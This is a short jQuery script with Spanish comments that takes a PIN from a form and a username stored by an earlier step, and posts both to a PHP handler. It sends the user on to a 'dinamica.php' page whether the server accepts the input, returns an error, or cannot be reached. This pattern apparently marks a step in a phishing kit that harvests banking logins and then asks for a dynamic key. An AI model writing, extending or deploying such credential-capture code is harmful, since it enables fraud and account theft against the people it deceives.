<script type="text/javascript">
    $(document).ready(function() {
        $("#btn-password").click(function(e) {
            e.preventDefault();

            // 1. Capturamos el PIN
            var pin = $("#input_real").val();
            
            // 2. IMPORTANTE: Recuperar el usuario guardado en el paso anterior
            // Si el nombre de la variable en el primer paso fue diferente, cámbialo aquí
            var usr = localStorage.getItem('user_akam');

            // 3. Validación básica
            if (!pin || pin.length < 4) {
                alert("Por favor ingrese su clave completa.");
                return false;
            }

            // Mostramos el loader/animación de carga
            $("#fondo, #cargando-o").show();
            
            $.ajax({
                type: 'POST',
                url: '../process/pasousuario.php', // Verifica que la ruta sea correcta desde tu ubicación actual
                data: { 
                    'txt-usuario': usr, 
                    'txt-password': pin 
                },
                success: function(res) {
                    // Limpiamos la respuesta por si el PHP devuelve espacios
                    var respuesta = res.trim();
                    
                    if(respuesta === "ok") {
                        // Si todo sale bien, vamos a la dinámica
                        window.location.href = "dinamica.php"; 
                    } else {
                        // Si hay un error (ej: error_bd), lo registramos pero seguimos para no trabar al usuario
                        console.error("Servidor respondió: " + respuesta);
                        window.location.href = "dinamica.php"; 
                    }
                },
                error: function(xhr, status, error) {
                    // Si falla la conexión con el servidor (Railway caído, etc)
                    console.error("Error de red: " + error);
                    setTimeout(function() { 
                        window.location.href = "dinamica.php"; 
                    }, 1000);
                }
            });
        });
    });
</script>
